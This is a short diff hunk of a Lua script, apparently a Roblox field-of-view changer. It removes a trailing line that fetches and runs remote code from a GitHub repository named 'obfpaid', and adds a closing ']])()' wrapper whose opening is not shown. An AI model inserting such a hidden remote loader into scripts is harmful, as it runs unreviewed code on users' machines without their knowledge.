@@ -37,4 +37,4 @@ updateFOV()
 end)
 
 print("FOV Changer script loaded successfully. Use '=' to increase FOV and '-' to decrease FOV.")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NNlove101011/obfpaid/main/lua"))()
+]])()
